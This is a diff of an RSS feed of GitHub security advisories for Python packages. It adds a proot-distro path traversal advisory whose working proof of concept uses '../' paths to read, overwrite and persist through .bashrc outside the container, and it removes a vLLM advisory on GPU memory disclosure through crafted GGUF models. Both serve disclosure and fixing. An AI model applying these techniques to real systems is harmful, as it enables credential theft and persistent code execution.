@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-07-17T20:12:13.579Z</updated>
+    <updated>2026-07-17T21:07:28.009Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,178 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[proot-distro] PRoot-Distro has Path Traversal in proot-distro copy — Arbitrary Read, Write, and Persistent Code Execution Outside Container Rootfs]]></title>
+        <id>https://github.com/advisories/GHSA-mfr4-mq8w-vmg6</id>
+        <link href="https://github.com/advisories/GHSA-mfr4-mq8w-vmg6"/>
+        <updated>2026-07-17T20:25:38.000Z</updated>
+        <content type="html"><![CDATA[<h1>Path Traversal in <code>proot-distro copy</code> — Arbitrary Read, Write, and Persistent Code Execution Outside Container Rootfs</h1>
+<h2>Repository</h2>
+<p>https://github.com/termux/proot-distro</p>
+<p><strong>Maintainer:</strong> @sylirre</p>
+<hr>
+<h2>Affected Component</h2>
+<ul>
+<li><strong>Package:</strong> proot-distro</li>
+<li><strong>Affected command:</strong> <code>copy</code></li>
+<li><strong>Attack surface:</strong> Host-side Termux CLI — this is not a guest distro shell issue</li>
+<li><strong>Vulnerability type:</strong> Path Traversal (CWE-22)</li>
+</ul>
+<hr>
+<h2>Affected Versions</h2>
+
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Version</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>proot-distro</td>
+<td>4.38.0 (initially discovered), 5.0.2 (confirmed still affected — tested on 2026-05-19)</td>
+</tr>
+<tr>
+<td>Test distro</td>
+<td>Ubuntu 25.10 "Questing Quokka" (ubuntu alias)</td>
+</tr>
+<tr>
+<td>Architecture</td>
+<td>aarch64</td>
+</tr>
+<tr>
+<td>Device</td>
+<td>Samsung A23</td>
+</tr>
+<tr>
+<td>Package source</td>
+<td><a href="https://packages-cf.termux.dev/apt/termux-main">https://packages-cf.termux.dev/apt/termux-main</a> stable/main aarch64</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>Proof of Concept</h2>
+<p>All tests were performed using only self-owned files and harmless marker data.
+No root was used. No third-party data was involved. The <code>.bashrc</code> overwritten
+during testing was immediately restored.</p>
+<h3>Step 1 — Setup</h3>
+<pre><code>rm -rf ~/poc
+mkdir -p ~/poc
+</code></pre>
+<hr>
+<h3>Step 2 — Arbitrary write (overwrite a file outside the container rootfs)</h3>
+<pre><code>echo "ORIGINAL" &gt; ~/poc/target.txt
+echo "PWNED_BY_PROOT_DISTRO" &gt; ~/poc/evil.txt
+
+</code><p><code>proot-distro copy <br>  ~/poc/evil.txt <br>  "ubuntu:$(printf '../%.0s' {1..20})data/data/com.termux/files/home/poc/target.txt"
+</code></p></pre><p></p>
+<p>Observed output:</p>
+<pre><code>[*] Source: '/data/data/com.termux/files/home/poc/evil.txt'
+[*] Destination: '/data/data/com.termux/files/home/poc/target.txt'
+[*] Copying files, this may take a while...
+[*] Finished copying files.
+</code></pre>
+<p>Verification:</p>
+<pre><code>cat ~/poc/target.txt
+→ PWNED_BY_PROOT_DISTRO
+</code></pre>
+<p>This confirms that the destination resolved to a path outside the container
+rootfs and the file was overwritten successfully.</p>
+<hr>
+<h3>Step 3 — Arbitrary read (exfiltrate a file from outside the container rootfs)</h3>
+<pre><code>echo "TOP_SECRET" &gt; ~/poc/secret.txt
+
+</code><p><code>proot-distro copy <br>  "ubuntu:$(printf '../%.0s' {1..20})data/data/com.termux/files/home/poc/secret.txt" <br>  ~/poc/read_result.txt
+</code></p></pre><p></p>
+<p>Observed output:</p>
+<pre><code>[*] Source: '/data/data/com.termux/files/home/poc/secret.txt'
+[*] Destination: '/data/data/com.termux/files/home/poc/read_result.txt'
+[*] Copying files, this may take a while...
+[*] Finished copying files.
+</code></pre>
+<p>Verification:</p>
+<pre><code>cat ~/poc/read_result.txt
+→ TOP_SECRET
+</code></pre>
+<p>This confirms that the source path resolved to a file outside the container
+rootfs and its contents were successfully copied to a host-side destination.</p>
+<hr>
+<h3>Step 4 — Persistent code execution via <code>.bashrc</code> overwrite</h3>
+<pre><code>printf 'echo VULN_TRIGGERED &gt; ~/poc/proof.txt\n' &gt; ~/poc/payload.sh
+
+</code><p><code>proot-distro copy ~/poc/payload.sh <br>  "ubuntu:$(printf '../%.0s' {1..20})data/data/com.termux/files/home/.bashrc"
+</code></p></pre><p></p>
+<p>Observed output:</p>
+<pre><code>[*] Source: '/data/data/com.termux/files/home/poc/payload.sh'
+[*] Destination: '/data/data/com.termux/files/home/.bashrc'
+[*] Copying files, this may take a while...
+[*] Finished copying files.
+</code></pre>
+<p>Verification before restart:</p>
+<pre><code>cat ~/.bashrc
+→
+echo VULN_TRIGGERED &gt; ~/poc/proof.txt
+</code></pre>
+<p>After closing and reopening Termux, the new shell sourced <code>.bashrc</code> and
+executed the payload automatically:</p>
+<pre><code>cat ~/poc/proof.txt
+→ VULN_TRIGGERED
+</code></pre>
+<p>This confirms that attacker-controlled content written into <code>.bashrc</code> executes
+automatically on the next shell launch, resulting in persistent local code
+execution within the Termux app context.</p>
+<hr>
+<h2>Attack Scenario</h2>
+<p>The most realistic exploitation path is a confused deputy scenario: a community
+script, Termux plugin, or automated tool calls <code>proot-distro copy</code> with a path
+derived from untrusted input. The attacker supplies a crafted container path.
+The tool resolves it to a host-side location and reads or writes the file
+without any boundary check. The user sees normal command output and no
+indication that a file outside the container was touched.</p>
+<p>On a real device with SSH keys or stored credentials in the Termux home
+directory, the read primitive allows silent credential theft. The write
+primitive to <code>.bashrc</code> allows persistent code execution triggered on next login.</p>
+<hr>
+<h2>Proposed Fix</h2>
+<p>After resolving the container-relative path, verify that the canonical result
+remains inside the container rootfs before allowing any read or write operation.
+Example mitigation pattern in Python:</p>
+<pre><code>import os
+
+</code><p><code>def safe_resolve(rootfs, container_path):
+    candidate = os.path.realpath(os.path.join(rootfs, container_path.lstrip('/')))
+    root = os.path.realpath(rootfs)
+    if candidate != root and not candidate.startswith(root + os.sep):
+        raise ValueError("path traversal detected: resolved path escapes rootfs")
+    return candidate
+</code></p></pre><p></p>
+<p>This check must be applied to both the source and destination paths in the
+<code>copy</code> subcommand.</p>
+<hr>
+<h2>Additional Notes</h2>
+<ul>
+<li>This issue was reproduced on the official Termux release from
+https://packages-cf.termux.dev, not a fork.</li>
+<li>No root access was used at any point during testing.</li>
+<li>All test files were self-owned and contained only harmless marker data.</li>
+<li>The <code>.bashrc</code> overwritten during testing was immediately restored after
+verification.</li>
+</ul>
+### References
+
+<ul>
+<li><a href="https://github.com/termux/proot-distro/security/advisories/GHSA-mfr4-mq8w-vmg6">https://github.com/termux/proot-distro/security/advisories/GHSA-mfr4-mq8w-vmg6</a></li>
+<li><a href="https://github.com/termux/proot-distro/releases/tag/v5.1.0">https://github.com/termux/proot-distro/releases/tag/v5.1.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-mfr4-mq8w-vmg6">https://github.com/advisories/GHSA-mfr4-mq8w-vmg6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mfr4-mq8w-vmg6</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-17T20:25:37.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[Flask-Reuploaded] Flask-Reuploaded: Extension-denylist bypass via case-folding asymmetry in name-override path (incomplete-fix variant of CVE-2026-27641)]]></title>
         <id>https://github.com/advisories/GHSA-937x-gpqr-72gg</id>
@@ -2118,104 +2290,5 @@ tRNS:  <a href="http://qiniu.funxingzuo.top/hello.png">http://qiniu.funxingzuo.t
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-06-17T14:02:42.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[vllm] vLLM: GGUF dequantize kernel int truncation exposes uninitialized GPU memory in multi-tenant serving]]></title>
-        <id>https://github.com/advisories/GHSA-5jv2-g5wq-cmr4</id>
-        <link href="https://github.com/advisories/GHSA-5jv2-g5wq-cmr4"/>
-        <updated>2026-07-17T16:20:59.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Integer truncation of tensor dimensions in vLLM's GGUF dequantize kernels (<code>csrc/quantization/gguf/gguf_kernel.cu</code>) causes partial tensor processing. The output tensor is allocated at full size via <code>torch::empty</code> (uninitialized memory), but the dequantize CUDA kernel processes only a truncated number of elements. The unfilled portion of the output tensor retains whatever was previously in GPU memory. In multi-tenant inference deployments, this residual GPU memory may contain tensor data from other users' inference requests, constituting information disclosure.</p>
-<h2 id="root-cause">Root Cause</h2>
-<p>The <code>to_cuda_ggml_t</code> function pointer type at <code>ggml-common.h:1067</code> declares its element count parameter as <code>int</code> (32-bit):</p>
-<pre><code class="language-cpp">using to_cuda_ggml_t = void (*)(const void * __restrict__ x,
-                                dst_t * __restrict__ y,
-                                int k,              // 32-bit
-                                cudaStream_t stream);
-</code></pre>
-<p>All dequantize kernel functions (<code>dequantize_block_cuda</code>, <code>dequantize_row_q2_K_cuda</code>, etc. in <code>dequantize.cuh</code>) inherit this <code>int k</code> parameter and use it as the kernel launch grid size:</p>
-<pre><code class="language-cpp">static void dequantize_block_cuda(..., const int k, cudaStream_t stream) {
-    const int num_blocks = (k + 2*CUDA_DEQUANTIZE_BLOCK_SIZE - 1) / (2*CUDA_DEQUANTIZE_BLOCK_SIZE);
-    dequantize_block&lt;&lt;&lt;num_blocks, CUDA_DEQUANTIZE_BLOCK_SIZE, 0, stream&gt;&gt;&gt;(vx, y, k);
-}
-</code></pre>
-<p>In <code>ggml_dequantize()</code> at <code>gguf_kernel.cu:85</code>, the caller passes <code>m * n</code> (an <code>int64_t</code> product) to this <code>int k</code> parameter:</p>
-<pre><code class="language-cpp">at::Tensor DW = torch::empty({m, n}, options);    // line 80: full-size, UNINITIALIZED
-// ...
-to_cuda((void*)W.data_ptr(), (scalar_t*)DW.data_ptr(), m * n, stream);  // line 85: m*n truncated to int
-</code></pre>
-<p>When <code>m * n &gt; INT_MAX</code>, the truncated <code>k</code> is smaller than the actual tensor size. The kernel processes <code>k</code> elements. The remaining <code>(m * n) - k</code> elements in <code>DW</code> are never written and contain stale GPU memory.</p>
-<p>This is a single root cause -- the <code>int</code> type on the <code>k</code> parameter in <code>to_cuda_ggml_t</code> -- with a single fix: change <code>int k</code> to <code>int64_t k</code>. All dequantize functions inherit this type through the same typedef.</p>
-<h2 id="affected-functions">Affected Functions</h2>
-<p>All in <code>csrc/quantization/gguf/gguf_kernel.cu</code>:</p>
-<table>
-<thead>
-<tr>
-<th>Function</th>
-<th>Line</th>
-<th>Allocation</th>
-<th>Info Disclosure?</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>ggml_dequantize</code></td>
-<td>74</td>
-<td><code>torch::empty({m, n})</code> at line 80</td>
-<td>Yes -- <code>m*n</code> truncated to <code>int k</code> at line 85</td>
-</tr>
-<tr>
-<td><code>ggml_mul_mat_vec_a8</code></td>
-<td>91</td>
-<td><code>torch::empty({vecs, row})</code> at line 99</td>
-<td>Yes -- <code>int col = X.sizes()[1]</code> at line 94</td>
-</tr>
-<tr>
-<td><code>ggml_mul_mat_a8</code></td>
-<td>207</td>
-<td><code>torch::empty({batch, row})</code> at line 215</td>
-<td>Yes -- <code>int col = X.sizes()[1]</code> at line 210</td>
-</tr>
-<tr>
-<td><code>ggml_moe_a8</code></td>
-<td>279</td>
-<td><code>torch::empty({tokens*top_k, row})</code> at line 289</td>
-<td>Yes -- <code>int col = X.sizes()[1]</code> at line 285</td>
-</tr>
-</tbody></table>
-<p>All four functions allocate output tensors with <code>torch::empty</code> (uninitialized) and then run CUDA kernels that use truncated dimension values as loop bounds. The unfilled portion of each output tensor retains stale GPU memory.</p>
-<p><code>ggml_moe_a8_vec</code> (line 382) uses <code>torch::zeros</code> instead of <code>torch::empty</code>, so it is not affected by the info disclosure variant.</p>
-<h2 id="impact-information-disclosure-in-multi-tenant-serving">Impact: Information Disclosure in Multi-Tenant Serving</h2>
-<p>vLLM is designed for multi-tenant inference serving. GPU memory is reused across requests from different users. When the dequantize kernel partially fills an output tensor:</p>
-<ol>
-<li>The output tensor <code>DW</code> is allocated with <code>torch::empty</code> -- the buffer contains whatever was previously in that GPU memory region</li>
-<li>The dequantize kernel fills only a truncated portion of the buffer</li>
-<li>The unfilled portion retains residual data from prior GPU operations, which may include tensor data from other users' inference requests</li>
-<li>The contaminated tensor proceeds through the model computation</li>
-<li>No error or warning is generated -- the partial fill is silent</li>
-</ol>
-<p>This is a confidentiality violation. In shared inference deployments (the primary vLLM use case), one user's inference data can leak into another user's model computation through residual GPU memory.</p>
-<h2 id="attacker-control">Attacker Control</h2>
-<p>The attacker crafts a GGUF model file with weight tensor dimensions whose product exceeds <code>INT_MAX</code> (e.g., a matrix with shape <code>[65536, 65536]</code> gives <code>m * n = 4,294,967,296</code>). The model is hosted on HuggingFace or any model hub. The victim loads the model with vLLM for inference serving. The truncation happens automatically during model weight dequantization.</p>
-<h2 id="fix">Fix</h2>
-<p>A fix for this vulnerability was added here: <a href="https://github.com/vllm-project/vllm/pull/44971">https://github.com/vllm-project/vllm/pull/44971</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-5jv2-g5wq-cmr4">https://github.com/vllm-project/vllm/security/advisories/GHSA-5jv2-g5wq-cmr4</a></li>
-<li><a href="https://github.com/vllm-project/vllm/pull/44971">https://github.com/vllm-project/vllm/pull/44971</a></li>
-<li><a href="https://github.com/vllm-project/vllm/commit/f219788f91952827132fa4fdf916427cd20d225e">https://github.com/vllm-project/vllm/commit/f219788f91952827132fa4fdf916427cd20d225e</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53923">https://nvd.nist.gov/vuln/detail/CVE-2026-53923</a></li>
-<li><a href="https://github.com/advisories/GHSA-5jv2-g5wq-cmr4">https://github.com/advisories/GHSA-5jv2-g5wq-cmr4</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/vllm/PYSEC-2026-3403.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/vllm/PYSEC-2026-3403.yaml</a></li>
-<li><a href="https://github.com/vllm-project/vllm">https://github.com/vllm-project/vllm</a></li>
-<li><a href="https://pypi.org/project/vllm">https://pypi.org/project/vllm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5jv2-g5wq-cmr4</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-17T14:03:11.000Z</published>
     </entry>
 </feed>
